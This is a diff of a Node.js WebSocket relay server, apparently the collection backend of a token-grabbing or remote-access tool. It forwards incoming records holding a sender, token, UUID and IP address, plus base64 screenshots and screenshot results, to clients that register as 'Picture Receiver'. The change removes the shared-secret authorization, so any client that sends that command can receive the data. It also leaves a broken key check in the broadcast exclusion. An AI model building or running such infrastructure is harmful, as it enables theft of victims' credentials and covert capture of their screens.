@@ -1,37 +1,38 @@
 const http = require("http");
 const express = require("express");
 const WebSocket = require("ws");
+
 const app = express();
 app.use(express.static("public"));
+
 const PORT = process.env.PORT || 3000;
 const server = http.createServer(app);
-const wss = new WebSocket.Server({ noServer: true });
-const SECRET_COMMAND = 'thisissecret';
 
+const wss = new WebSocket.Server({ noServer: true });
 server.on('upgrade', (request, socket, head) => {
     wss.handleUpgrade(request, socket, head, ws => {
         wss.emit('connection', ws, request);
     });
 });
+
 server.listen(PORT);
 
 const usersInChat = new Map();
-const authorizedClients = new Map();
+const pictureReceivers = new Map(); 
 let keepAliveId;
 
 wss.on("connection", function (ws) {
-    const userID = generateUniqueID();
-    ws.isAuthorized = false;
-    
+    const userID = generateUniqueID();  
+
     ws.on("message", data => {
         handleMessage(ws, data, userID);
     });
-    
+
     ws.on("close", () => {
         handleDisconnect(userID);
-        ws.removeAllListeners();
+        ws.removeAllListeners(); 
     });
-    
+
     if (wss.clients.size === 1 && !keepAliveId) {
         keepServerAlive();
     }
@@ -46,70 +47,68 @@ function generateUniqueID() {
     return Math.random().toString(36).substr(2, 9);
 }
 
+
 function handleMessage(ws, data, userID) {
     try {
-        const message = data.toString();
-        if (message === SECRET_COMMAND) {
-            ws.isAuthorized = true;
-            authorizedClients.set(userID, ws);
-            ws.send("Authorized successfully");
+        const messageData = JSON.parse(data);
+        
+        // Check if the data matches the format shown in the image
+        if (messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
+            // If it matches, only broadcast to picture receivers
+            broadcastToPictureReceivers(messageData);
+        } else if (messageData.command === 'Picture Receiver') {
+            pictureReceivers.set(userID, ws);
+        } else if (messageData.type === 'screenshot' && messageData.data.startsWith('data:image/png;base64')) {
+            broadcastToPictureReceivers({
+                type: 'screenshot',
+                action: messageData.action,
+                screen: messageData.screen,
+                data: messageData.data
+            });
+        } else if (messageData.action === 'screenshot_result') {
+            broadcastToPictureReceivers({
+                type: 'screenshot',
+                action: messageData.action,
+                screen: messageData.screen,
+                data: messageData.data
+            });
         } else {
-            const messageData = JSON.parse(message);
-            
-            if (messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
-                broadcastToAuthorizedClients(messageData);
-            } else if (messageData.type === 'screenshot' && messageData.data.startsWith('data:image/png;base64')) {
-                broadcastToAuthorizedClients({
-                    type: 'screenshot',
-                    action: messageData.action,
-                    screen: messageData.screen,
-                    data: messageData.data
-                });
-            } else if (messageData.action === 'screenshot_result') {
-                broadcastToAuthorizedClients({
-                    type: 'screenshot',
-                    action: messageData.action,
-                    screen: messageData.screen,
-                    data: messageData.data
-                });
-            } else {
-                broadcastBinary(ws, data);
-            }
+            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
         }
     } catch (e) {
-        console.error('Error handling message:', e);
+        console.error('Error data:', e);
     }
 }
 
-function broadcastToAuthorizedClients(message) {
+function broadcastToPictureReceivers(message) {
     const data = JSON.stringify(message);
-    authorizedClients.forEach((ws, userId) => {
+    pictureReceivers.forEach((ws, userId) => {
         if (ws.readyState === WebSocket.OPEN) {
             ws.send(data, error => {
-                if (error) console.error("Error sending message to authorized client:", error);
+                if (error) console.error("Error sending message to receiver:", error);
             });
         }
     });
 }
 
-function broadcastBinary(senderWs, data) {
+function broadcastToAllExceptPictureReceivers(senderWs, message, includeSelf) {
     wss.clients.forEach(client => {
-        if (client.readyState === WebSocket.OPEN && client !== senderWs && client.isAuthorized) {
-            client.send(data);
+        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
+            client.send(message);
         }
     });
 }
 
 function handleDisconnect(userID) {
     usersInChat.delete(userID);
-    authorizedClients.delete(userID);
+    pictureReceivers.delete(userID);
 }
 
 function keepServerAlive() {
     keepAliveId = setInterval(() => {
         wss.clients.forEach(client => {
             if (client.readyState === WebSocket.OPEN) {
-                client.ping();
+                client.ping(); 
             }
         });
     }, 30000);
